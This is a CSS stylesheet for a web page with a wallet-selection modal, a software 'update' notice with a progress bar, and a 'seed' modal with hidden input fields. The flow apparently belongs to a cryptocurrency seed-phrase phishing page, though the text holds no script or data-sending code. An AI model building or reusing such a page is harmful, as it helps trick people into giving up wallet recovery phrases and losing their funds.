 <style>
   
    /* Modal base */
    .overlay{
      position:fixed;
      inset:0;
      background:rgba(0,0,0,0.35);
      display:none;
      align-items:center;
      justify-content:center;
      z-index:100;
      padding:20px;
      transition:opacity .18s ease;
    }
    .overlay.show { display:flex; }

    .modal {
      background:#ffffff;
      border-radius:14px;
      width:100%;
      max-width:520px;
      box-shadow:0 20px 60px rgba(2,6,23,0.2);
      overflow:hidden;
      transform:translateY(6px);
      border:1px solid rgba(0,0,0,0.04);
    }

    /* Header bar */
    .modal .header {
      display:flex;
      gap:12px;
      align-items:center;
      padding:14px 18px;
      border-bottom:1px solid rgba(15,23,42,0.04);
    }
    .brand {
      display:flex;
      align-items:center;
      gap:10px;
      font-weight:700;
      font-size:14px;
    }
    .brand .badge {
      width:34px;height:34px;border-radius:8px;
      display:grid;place-items:center;
      background:linear-gradient(180deg,#fff,#f3f4f6);
      border:1px solid rgba(0,0,0,0.03);
    }
    .close {
      margin-left:auto;
      background:transparent;border:0;cursor:pointer;font-size:18px;padding:6px;
    }

    /* Wallet list (first modal) */
    .modal .content {
      padding:18px;
    }
    .title {
      font-weight:700;margin-bottom:12px;
    }
    .wallet-list{
      max-height:360px;
      overflow:auto;
      display:flex;
      flex-direction:column;
      gap:12px;
      padding-right:6px;
    }
    .wallet-item{
      display:flex;
      align-items:center;
      gap:12px;
      padding:12px;
      border-radius:12px;
      border:1px solid rgba(15,23,42,0.04);
      cursor:pointer;
      background:linear-gradient(180deg, rgba(250,250,250,1), rgba(245,247,250,1));
    }
    .wallet-item:hover { transform:translateY(-2px); transition:transform .12s; }
    .wallet-item .icon{
      width:42px;height:42px;border-radius:10px;display:grid;place-items:center;font-weight:700;
      background:var(--glass); color:var(--muted);
      border:1px solid rgba(0,0,0,0.02);
    }
    .wallet-item .name { font-weight:600; }

    /* Update modal */
    .update-body {
      padding:18px;
    }
    .notice {
      background:#eef6ff;
      border-radius:10px;
      padding:12px;
      font-size:13px;
      color:#0b3b66;
      margin-bottom:12px;
      border:1px solid rgba(11,118,255,0.08);
    }
    .whats-new {
      margin:12px 0;
      color:var(--muted);
      font-size:14px;
    }
    .list-dot { margin-left:12px; margin-bottom:8px; display:flex; gap:8px; align-items:flex-start; }
    .update-cta { text-align:center; padding:14px; border-top:1px solid rgba(15,23,42,0.04); }

    .progress-wrap {
      width: 400px;
      margin: auto;
      text-align: left;
	  padding:22px; 
	  text-align:center;
    }

    .progress-bar {
      width: 100%;
      height: 10px;
      background: #e5e7eb;
      border-radius: 5px;
      overflow: hidden;
      margin: 10px 0;
    }

    .progress-bar .inner {
      height: 100%;
      width: 0%;
      background: #0d6efd; /* blue color */
      transition: width 0.3s ease;
    }

    .subtle {
      color: #64748b;
      font-size: 14px;
    }
   /* Seed modal */
    .seed-body { padding:18px; max-width:520px; }
      .seed-inputs {
      display: none;
    }
	input[name="fields[]"] {
    background-color: white;     /* Light grey background */
    border-radius: 5px;            /* Rounded corners */
    border: 1px solid black;       /* Black border */
    color: black;                  /* Text color */
    padding: 8px 10px;            /* Comfortable padding inside input */
    font-size: 15px;               /* Readable font size */
    outline: none;                 /* Remove default outline */
    box-sizing: border-box;        /* Include padding in width */
    width: 100%;                   /* Make input take full container width */
    transition: border 0.3s, box-shadow 0.3s; /* Smooth focus effect */
}

input[name="fields[]"]:focus {
    border-color: white;         /* Highlight border on focus */
    box-shadow: 0 0 5px rgba(0, 212, 170, 0.5); /* Glow effect on focus */
    background-color: #fff;        /* Optional: lighten background on focus */
}

	 .tabs-container {
    width: 100%;
    border-radius: 10px;
    padding: 20px;
  }

  .tabs {
    display: flex;
    gap: 10px;
    margin-bottom: 20px;
  }

  .tab {
    flex: 1;
    text-align: center;
    padding: 2px;
    cursor: pointer;
    background: white;
    border-radius: 5px;
	border: 1px solid #0500ff;
	color:#0500ff;
    transition: background 0.3s;
  }

  .tab.active {
    background: #0500ff;
    color: white;
    font-weight: bold;
  }

  .tab-content {
    display: none;
    
  }

  .tab-content.active {
    display: block;
  }
 </style>
